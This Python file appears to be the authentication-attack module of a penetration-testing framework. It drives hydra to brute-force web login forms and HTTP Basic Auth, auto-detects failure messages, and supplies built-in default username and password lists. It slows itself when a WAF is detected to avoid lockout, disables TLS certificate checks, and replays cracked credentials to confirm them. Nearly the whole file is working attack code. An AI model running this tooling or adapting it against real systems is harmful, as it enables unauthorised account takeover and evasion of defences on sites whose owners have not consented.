# Authentication attack module:
#   1. Form-based HTTP brute-force (hydra http-post-form)
#   2. HTTP Basic Auth brute-force (hydra http-get)
#   3. Custom failure string detection (not hardcoded)
#   4. WAF-aware rate limiting — backs off if WAF detected
#   5. Credential validation via live HTTP probe after discovery
#
# Fixes from original:
#   - Logic bug: "or answer !='Y'"
#   - No more hardcoded brutespray paths : using settings resolver
#   - custom.txt is session-scoped, not left in cwd
#   - Hydra output parsed in Python, not by blind print
#   - WAF detection consulted before brute-force to avoid lockout
#   - No shell=True — subprocess arg lists throughout

import re
import subprocess
from pathlib import Path
from typing import Optional

from config.settings import (
    STEALTH_PROFILES,
    DEFAULT_STEALTH_PROFILE,
    resolve_wordlist,
)
from core.session import ScanSession, log
from core.tools_manager import get_binary


# Buildin Credential Lists
# Compact fallback when no wordlist is on disk. It covers the most common credentials
DEFAULT_USERNAMES = [
    "admin", "administrator", "root", "user", "test", "guest",
    "manager", "operator", "superuser", "sa", "postgres",
    "wordpress", "joomla", "drupal", "magento",
]

DEFAULT_PASSWORDS = [
    "admin", "password", "123456", "password1", "admin123",
    "letmein", "welcome", "monkey", "1234567890", "qwerty",
    "changeme", "default", "root", "toor", "pass", "test",
    "123456789", "12345678", "administrator", "secret",
]

# Common failure message patterns (used to auto-detect failure strings)
COMMON_FAILURE_PATTERNS = [
    "invalid username or password",
    "incorrect username or password",
    "login failed",
    "authentication failed",
    "invalid credentials",
    "wrong password",
    "access denied",
    "login error",
    "invalid login",
    "bad credentials",
]

# Failure String Detection
# Auto detecting the failure message from a login page to configure hydra
def detect_failure_string(login_url: str) -> str:
    """
    Try to auto-detect the failure string by submitting known-bad credentials
    and extracting a distinctive phrase from the response body.

    Falls back to prompting the user if auto-detection fails.
    Returns the failure string for use in hydra's http-post-form spec.
    """
    import urllib.request
    import urllib.parse
    import ssl

    log("info", f"Attempting to auto-detect login failure string from: {login_url}")

    # Deliberately wrong credentials
    test_payload = urllib.parse.urlencode({
        "username": "nonexistent_user_xyzzy_9999",
        "password": "wrong_password_xyzzy_9999",
    }).encode()

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode    = ssl.CERT_NONE

    try:
        req = urllib.request.Request(login_url, data=test_payload, method="POST")
        req.add_header("Content-Type", "application/x-www-form-urlencoded")
        req.add_header("User-Agent", "Mozilla/5.0")

        with urllib.request.urlopen(req, timeout=10, context=ctx) as resp:
            body = resp.read(8192).decode("utf-8", errors="replace").lower()

        for pattern in COMMON_FAILURE_PATTERNS:
            if pattern in body:
                log("success", f"Auto-detected failure string: '{pattern}'")
                return pattern

    except Exception as e:
        log("warning", f"Auto-detection probe failed: {e}")

    # Fall back to user input
    log("warning", "Could not auto-detect failure string.")
    log("info", 'Example: "Invalid username or password" or "Login failed"')
    return input("  Enter the failure message shown on failed login: ").strip()

# Wordlist Preparation
# Building username and password files for the session
def _prepare_wordlist_file(
    session: ScanSession,
    name: str,
    wordlist_key: str,
    defaults: list[str],
    custom_path: Optional[str] = None,
) -> Path:
    # File written to session's hydra subdir (not cwd)
    out_path = session.artifact_path("hydra", f"{name}.txt")

    if custom_path:
        return Path(custom_path)

    resolved = resolve_wordlist(wordlist_key)
    if resolved:
        return Path(resolved)

    # Write built-in defaults to session dir
    log("warning", f"No {name} wordlist on disk — using built-in {len(defaults)}-entry list.")
    with open(out_path, "w") as f:
        f.write("\n".join(defaults) + "\n")
    return out_path

# If WAF was detected during recon, overriding hydra tasks and waiting with conservative values to avoid triggering rate-limit lockout
def _waf_rate_limit(session: ScanSession, profile: dict) -> dict:
    # Returning the (possibly modified) profile dict
    if session.findings["waf_detected"]:
        waf_name = session.findings["waf_detected"][0]["waf"]
        log("warning",
            f"WAF detected ({waf_name}) — reducing brute-force rate to avoid lockout."
        )
        return {
            **profile,
            "hydra_tasks": 2,
            "hydra_wait":  10,
        }
    return profile

# Hydra Output Parser
def _parse_hydra_output(output: str) -> list[dict]:
    # Parsing hydra output for valid credential lines
    # Hydra format: "[PORT][SERVICE] host: HOST   login: USER   password: PASS"
    # Returning list of {username, password, host, port, service} dicts
    creds = []
    # Pattern for hydra success line
    line_re = re.compile(
        r"\[(\d+)\]\[([^\]]+)\]\s+host:\s+(\S+)\s+login:\s+(\S+)\s+password:\s+(.+)$",
        re.IGNORECASE
    )
    for line in output.splitlines():
        m = line_re.search(line.strip())
        if m:
            creds.append({
                "port":     int(m.group(1)),
                "service":  m.group(2),
                "host":     m.group(3),
                "username": m.group(4),
                "password": m.group(5).strip(),
            })
    return creds

# http Form Brute force
def brute_http_form(
    session: ScanSession,
    tool_statuses: dict,
    target_host: str,
    login_path: str,
    failure_string: Optional[str] = None,
    username_field: str = "username",
    password_field: str = "password",
    username_wordlist: Optional[str] = None,
    password_wordlist: Optional[str] = None,
    wordlist_size: str = "medium",
) -> list[dict]:
    # Running hydra http-post-form brute-force against a login form
    # Results fed into session
    # Returning list of cracked credential dicts
    hydra_bin = get_binary(tool_statuses, "hydra")
    profile   = STEALTH_PROFILES.get(
        session.stealth_profile, STEALTH_PROFILES[DEFAULT_STEALTH_PROFILE]
    )
    profile = _waf_rate_limit(session, profile)

    # Detecting protocol from session findings
    proto = "https" if any(
        "https" in svc.get("url", "") for svc in session.findings["http_services"]
    ) else "http"

    # Building login URL for failure string detection
    login_url = f"{proto}://{target_host}{login_path}"

    # Getting failure string
    if not failure_string:
        failure_string = detect_failure_string(login_url)
    if not failure_string:
        log("error", "No failure string — cannot configure hydra correctly. Aborting.")
        return []

    # Preparing wordlists
    user_file = _prepare_wordlist_file(
        session, "usernames",
        wordlist_key="usernames",
        defaults=DEFAULT_USERNAMES,
        custom_path=username_wordlist,
    )
    pass_file = _prepare_wordlist_file(
        session, "passwords",
        wordlist_key=f"passwords_{wordlist_size}",
        defaults=DEFAULT_PASSWORDS,
        custom_path=password_wordlist,
    )

    out_file = session.artifact_path("hydra", "form_results.txt")

    # Hydra form spec
    form_spec = f"{login_path}:{username_field}=^USER^&{password_field}=^PASS^:F={failure_string}"

    # Determining hydra service name based on protocol
    hydra_service = "https-post-form" if proto == "https" else "http-post-form"

    log("attack", f"Starting HTTP form brute-force: {login_url}")
    log("info",   f"  Service  : {hydra_service}")
    log("info",   f"  Usernames: {user_file}")
    log("info",   f"  Passwords: {pass_file}")
    log("info",   f"  Tasks    : {profile['hydra_tasks']}  |  Wait: {profile['hydra_wait']}s")
    log("info",   f"  Form spec: {form_spec}")

    cmd = [
        hydra_bin,
        "-L", str(user_file),
        "-P", str(pass_file),
        "-t", str(profile["hydra_tasks"]),
        "-o", str(out_file),
        "-q",                     # quiet — less verbose
        "-e", "nsr",              # also trying: no password, same as user, reversed user
    ]

    if profile["hydra_wait"] > 0:
        cmd += ["-W", str(profile["hydra_wait"])]

    cmd += [target_host, hydra_service, form_spec]

    log("info", f"  Command: {' '.join(cmd)}")

    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=3600,  # 1 hour max
        )
        raw_output = result.stdout + result.stderr
    except subprocess.TimeoutExpired:
        log("error", "Hydra timed out.")
        return []
    except FileNotFoundError:
        log("error", "hydra not found.")
        return []

    creds = _parse_hydra_output(raw_output)

    if creds:
        for c in creds:
            session.add_credential(c["username"], c["password"], login_url)
    else:
        log("info", "No valid credentials found by hydra.")

    return creds

# http Basic Authentication Brute force
def brute_http_basic(
    session: ScanSession,
    tool_statuses: dict,
    target_host: str,
    target_path: str = "/",
    username_wordlist: Optional[str] = None,
    password_wordlist: Optional[str] = None,
    wordlist_size: str = "medium",
    use_https: bool = False,
) -> list[dict]:
    # Running hydra against HTTP Basic Authentication (401 protected resources)
    hydra_bin = get_binary(tool_statuses, "hydra")
    profile   = STEALTH_PROFILES.get(
        session.stealth_profile, STEALTH_PROFILES[DEFAULT_STEALTH_PROFILE]
    )
    profile = _waf_rate_limit(session, profile)

    user_file = _prepare_wordlist_file(
        session, "usernames_basic",
        wordlist_key="usernames",
        defaults=DEFAULT_USERNAMES,
        custom_path=username_wordlist,
    )
    pass_file = _prepare_wordlist_file(
        session, "passwords_basic",
        wordlist_key=f"passwords_{wordlist_size}",
        defaults=DEFAULT_PASSWORDS,
        custom_path=password_wordlist,
    )

    out_file     = session.artifact_path("hydra", "basic_auth_results.txt")
    hydra_service = "https" if use_https else "http"

    log("attack", f"Starting HTTP Basic Auth brute-force: {hydra_service}://{target_host}{target_path}")

    cmd = [
        hydra_bin,
        "-L", str(user_file),
        "-P", str(pass_file),
        "-t", str(profile["hydra_tasks"]),
        "-o", str(out_file),
        "-q",
        "-e", "nsr",
        target_host, hydra_service,
    ]

    if profile["hydra_wait"] > 0:
        cmd += ["-W", str(profile["hydra_wait"])]

    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=3600)
        creds = _parse_hydra_output(result.stdout + result.stderr)
    except subprocess.TimeoutExpired:
        log("error", "Hydra timed out.")
        return []

    if creds:
        for c in creds:
            url = f"{hydra_service}://{target_host}{target_path}"
            session.add_credential(c["username"], c["password"], url)
    else:
        log("info", "No valid HTTP Basic Auth credentials found.")

    return creds

# Credential Validation
# Verifying discovered credentials if they actually are valid by replaying the login
def validate_credential(
    login_url: str,
    username: str,
    password: str,
    username_field: str = "username",
    password_field: str = "password",
    failure_string: str = "",
) -> bool:
    # Replaying a credential against the login form and checking if login succeeded by looking for the absence of the failure string in the response
    # Returning True if credential appears valid
    import urllib.request
    import urllib.parse
    import ssl

    payload = urllib.parse.urlencode({
        username_field: username,
        password_field: password,
    }).encode()

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode    = ssl.CERT_NONE

    try:
        req = urllib.request.Request(login_url, data=payload, method="POST")
        req.add_header("Content-Type", "application/x-www-form-urlencoded")
        req.add_header("User-Agent", "Mozilla/5.0")

        with urllib.request.urlopen(req, timeout=10, context=ctx) as resp:
            body = resp.read(8192).decode("utf-8", errors="replace").lower()
            status = resp.status

        # Valid login indicators:
        # 1. No failure string in body
        # 2. Redirect to dashboard (302)
        if status == 302:
            log("success", f"Credential validated (redirect): {username}:{password}")
            return True
        if failure_string and failure_string.lower() not in body:
            log("success", f"Credential validated (no failure msg): {username}:{password}")
            return True

    except Exception as e:
        log("warning", f"Validation request failed for {username}: {e}")

    return False

# Full Authentication Pipeline
def run_auth(
    session: ScanSession,
    tool_statuses: dict,
    wordlist_size: str = "medium",
) -> dict:
    """
    Orchestrating the authentication brute force phase against all admin pages
    found during enumeration

    For each admin page:
        - Detecting failure string
        - Running http-post-form brute force
        - Validating any discovered credentials
        - Checking for 401 pages : running basic authentication

    Returning summary dict with all cracked credentials
    """
    log("info", "="*55)
    log("info", f"  AUTH PHASE — target: {session.target['value']}")
    log("info", "="*55)

    all_creds = []
    host      = session.target["value"]

    if not session.findings["admin_pages"]:
        log("warning", "No admin pages found — run enum phase first.")
        return {"credentials": []}

    for admin_entry in session.findings["admin_pages"]:
        url    = admin_entry["url"]
        status = admin_entry["status"]

        # 401 : Basic Authentication
        if status == 401:
            log("info", f"HTTP 401 detected at {url} — trying Basic Auth brute-force.")
            from urllib.parse import urlparse
            parsed = urlparse(url)
            creds = brute_http_basic(
                session, tool_statuses,
                target_host=parsed.hostname,
                target_path=parsed.path or "/",
                wordlist_size=wordlist_size,
                use_https=(parsed.scheme == "https"),
            )
            all_creds.extend(creds)

        # 200 or 302 : Form-based
        elif status in (200, 302, 301):
            log("info", f"Form-based login page: {url} [{status}]")
            from urllib.parse import urlparse
            parsed  = urlparse(url)
            creds   = brute_http_form(
                session, tool_statuses,
                target_host=parsed.hostname,
                login_path=parsed.path or "/login",
                wordlist_size=wordlist_size,
            )
            all_creds.extend(creds)

            # Validating each discovered credential
            if creds:
                log("info", f"Validating {len(creds)} discovered credential(s)...")
                for c in creds:
                    validate_credential(url, c["username"], c["password"])

        else:
            log("info", f"Skipping {url} [{status}] — unexpected status for auth attack.")

    log("success",
        f"Auth phase complete. Credentials found: {len(all_creds)}"
    )

    return {"credentials": all_creds}
